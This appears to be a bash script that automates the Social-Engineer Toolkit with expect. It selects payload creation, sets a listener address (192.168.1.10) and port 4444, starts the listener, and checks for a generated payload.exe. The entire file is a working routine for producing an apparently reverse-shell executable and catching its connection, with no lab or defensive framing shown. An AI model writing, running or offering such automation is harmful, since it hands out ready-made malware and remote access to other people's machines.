#!/bin/bash

# 1. Automate SET in the background using expect
expect -c '
    set timeout 120
    spawn sudo setoolkit
    expect "set>"; send "1\r"
    expect "set:attacks>"; send "4\r"
    expect "set:payloads>"; send "2\r"
    expect "LHOST"; send "192.168.1.10\r"
    expect "Port"; send "4444\r"
    expect "listener now?"; send "yes\r"
    interact
' &

# 2. Wait for generation to complete
echo "Generating payload..."
sleep 20

# 3. Verify output
if [ -f /root/.set/payload.exe ]; then
    echo "SET Payload generated successfully"
else
    echo "Error: Payload not found"
fi
